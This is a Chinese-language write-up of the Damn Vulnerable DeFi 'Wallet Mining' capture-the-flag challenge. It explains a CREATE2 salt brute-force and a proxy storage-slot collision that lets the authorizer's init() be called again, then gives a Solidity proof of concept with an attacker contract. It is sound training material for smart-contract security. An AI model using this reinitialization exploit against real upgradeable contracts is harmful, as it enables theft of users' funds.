## 题目 [Wallet Mining](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0/src/wallet-mining)

有一个合约会激励用户部署 Safe 钱包，并奖励他们 1 个 DVT 代币。该合约与一个可升级的授权机制集成在一起，只允许特定的部署者（即 “wards”）因特定的部署而获得报酬。  

该部署者合约只能与部署期间设定的 Safe 工厂和副本配合使用。看起来 [Safe singleton factory](https://github.com/safe-global/safe-singleton-factory) 已经被部署好了。  

团队将 2000 万个 DVT 代币转移给了地址 0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b 的用户，这个地址本应是她的普通 1-of-1 Safe 钱包所在的地方。但他们丢失了用于部署的 nonce 值。  

更糟的是，有传言说系统存在一个漏洞。团队因此非常紧张，没有人知道该怎么做，包括那个用户。她已经授予你访问她私钥的权限。  

你必须在为时已晚之前拯救所有资金！  

需要从钱包部署者合约中回收所有代币并将其发送到对应的 ward。同时，保存并返还所有用户的资金。  

所有这些操作必须在一个交易中完成。  

**要求：**  
1. USER_DEPOSIT_ADDRESS(0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b) 该地址必须有代码。
2. USER_DEPOSIT_ADDRESS 该地址余额清空。
3. 用来奖励 1 个 DVT 的合约余额清空。
4. user 账户，即给你私钥的那个账户，交易 nonce 为 0。
5. 你的交易 nonce 只为 1。
6. 你帮 user 账户找回了所有的代币，即 user 的余额为 2000 万 DVT。
7. wards 账户余额为 1 个 DVT。

总的来说，就是玩家（攻击者）需要从 USER_DEPOSIT_ADDRESS 地址中提取存款，并将这些代币转移到用户（user）账户，同时将支付一定数量的代币给 ward 地址。  

## 题解
1. 通过不断尝试 nonce 找到能部署出 0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b 的 safe 钱包地址的 nonce 值。
2. `TransparentProxy` 代理合约写的不规范，把升级者地址放在了存储槽 0 中，导致和逻辑合约 `AuthorizerUpgradeable` 中的 `needsInit` 产生冲突，而当 `needsInit` 不为 0 的时候，可以再次调用初始化 `init()` 函数，从而增加创建钱包获取的 1 DVT 的奖励的地址。并且在部署完逻辑合约和代理合约后，槽 0 存的应该是 `upgrader`。
3. 用获取的 nonce 值通过 `WalletDeployer` 合约部署 safe 钱包，地址为 0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b。
4. 把创建钱包获取的 1 DVT 转给给 ward 地址。
5. 由于我们有 user 的私钥，所以在创建 safe 钱包的时候，身份填的是 user，之后能签名把钱包里的钱提取出来。
6. 要求 player 只执行一笔交易，所以把 salt 值和签名准备好后，我们把逻辑都写在合约的构造函数中。

POC:
``` solidity
    function test_walletMining() public checkSolvedByPlayer {
        address ZEROAddr = address(0);
        address[] memory owners = new address[](1);
        owners[0] = user;

        bytes memory initializer = abi.encodeWithSelector(Safe.setup.selector, owners, 1, ZEROAddr, "", ZEROAddr, ZEROAddr, 0, ZEROAddr);

        bytes memory deploymentData = abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))));

        uint256 saltNonce;
        for (uint256 i = 0; i < 100; ++i) {
            bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), i));
            address walletAddress = Create2.computeAddress(salt, keccak256(deploymentData), address(proxyFactory));
            if (walletAddress == USER_DEPOSIT_ADDRESS) {
                console.log("nonce: ", i);
                saltNonce = i;
                break;
            }
        }

        // generate the tx and sign
        bytes memory execData;
        { 
            address to = address(token);
            uint256 value = 0;
            bytes memory data = abi.encodeWithSelector(token.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);
            Enum.Operation operation = Enum.Operation.Call;
            uint256 safeTxGas = 100000;
            uint256 baseGas = 100000;
            uint256 gasPrice = 0;
            address gasToken = address(0);
            address refundReceiver = address(0);
            uint256 nonce = 0;
            bytes memory signatures;

            // calculate tx hash by ourself
            // cannot use safe.getTransactionHash, as it is not deployed yet
            // cannot use singletonCopy.getTransactionHash, as domainSeparator contains the contract address
            { // avoid stack too deep   
                bytes32 safeTxHash = keccak256(
                    abi.encode(
                        0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8, // SAFE_TX_TYPEHASH,
                        to,
                        value,
                        keccak256(data),
                        operation,
                        safeTxGas,
                        baseGas,
                        gasPrice,
                        gasToken,
                        refundReceiver,
                        nonce
                    )
                );
                bytes32 domainSeparator = keccak256(abi.encode(
                    0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218, // DOMAIN_SEPARATOR_TYPEHASH,
                    singletonCopy.getChainId(),
                    USER_DEPOSIT_ADDRESS
                ));
                bytes32 txHash = keccak256(abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, safeTxHash));
                (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
                signatures = abi.encodePacked(r, s, v);
            }
            execData = abi.encodeWithSelector(singletonCopy.execTransaction.selector, to, value, data, operation, safeTxGas, baseGas, gasPrice, gasToken, refundReceiver, signatures);
        }
        new WalletMiningAttacker(token, authorizer, walletDeployer, USER_DEPOSIT_ADDRESS, ward, initializer, saltNonce, execData);
    }

```

```solidity
contract WalletMiningAttacker {
    constructor (DamnValuableToken token, AuthorizerUpgradeable authorizer, WalletDeployer walletDeployer, address safe, address ward, bytes memory initializer, uint256 saltNonce, bytes memory txData) {
        address[] memory wards = new address[](1);
        address[] memory aims = new address[](1);
        wards[0] = address(this);
        aims[0] = safe;
        authorizer.init(wards, aims);

        bool success = walletDeployer.drop(address(safe), initializer, saltNonce);
        require(success, "deploy failed");
        token.transfer(ward, token.balanceOf(address(this)));
        (success,) = safe.call(txData);
        require(success, "tx failed");
    }
}
```